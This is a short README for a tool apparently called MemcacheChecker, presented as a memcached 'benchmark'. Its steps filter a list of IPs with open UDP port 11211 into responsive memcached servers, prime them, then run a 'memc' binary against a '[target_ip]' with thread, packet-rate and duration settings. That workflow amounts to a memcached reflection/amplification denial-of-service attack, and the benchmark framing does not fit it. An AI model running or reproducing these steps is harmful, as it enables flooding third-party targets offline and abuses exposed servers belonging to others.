# MemcacheChecker
MemcacheStatusRespondChecker and MemcacheChecker and setup for a Memcache based Server\/Network benchmark.

## dependencies
[php-memecahed, php-cli, libmemcached, libpthread]

# How to use it?
You need a list of IP that opened udp port 11211;

php MemcacheStatusRespondChecker.php full_list.input respond.out 10 100;
php MemcacheChecker.php respond.out full_function.out 10 100;

We filtered IPs to full_function.out

php setup.php [target_ip] full_function.out setup.ready 1 100;
./memc [target_ip] 11211 setup.ready [threads] [packet_per_second] [time];
php setup.php [target_ip] setup.ready noting 0 100;
rm respond.out full_function.out setup.ready;
